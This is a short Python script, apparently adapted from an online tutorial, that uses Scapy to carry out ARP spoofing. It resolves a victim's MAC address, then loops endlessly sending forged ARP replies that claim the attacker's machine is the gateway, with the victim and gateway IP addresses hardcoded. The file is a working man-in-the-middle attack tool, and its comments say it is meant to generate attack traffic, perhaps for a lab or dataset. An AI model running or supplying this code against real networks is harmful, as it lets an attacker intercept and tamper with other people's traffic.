from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

# Source : https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# This file generate some attack :
# ARP spoofing

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

if __name__ == "__main__":
    # victim ip address
    target = "192.168.1.100"
    # gateway ip address
    host = "192.168.1.1"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    #enable_ip_route()
    while True:
        # telling the `target` that we are the `host`
        spoof(target, host, verbose)
        # sleep for one second
        time.sleep(1)
